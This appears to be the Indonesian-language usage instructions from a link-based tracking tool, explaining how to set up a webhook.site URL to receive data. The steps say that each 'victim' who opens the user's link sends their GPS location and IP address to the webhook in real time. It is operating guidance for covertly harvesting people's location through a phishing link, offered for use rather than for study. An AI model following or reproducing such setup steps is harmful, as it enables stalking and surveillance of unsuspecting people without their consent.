Cara Pakai Webhook
1. Buka webhook.site
2. Copy URL unik yang muncul otomatis (contoh: https://webhook.site/abc-123...)
3. Paste ke field Webhook URL di atas → Simpan
4. Setiap korban buka link lo → data GPS + IP langsung masuk ke webhook.site real-time dari device manapun
5. Log di bawah tetap ada untuk device yang sama browser-nya dengan lo
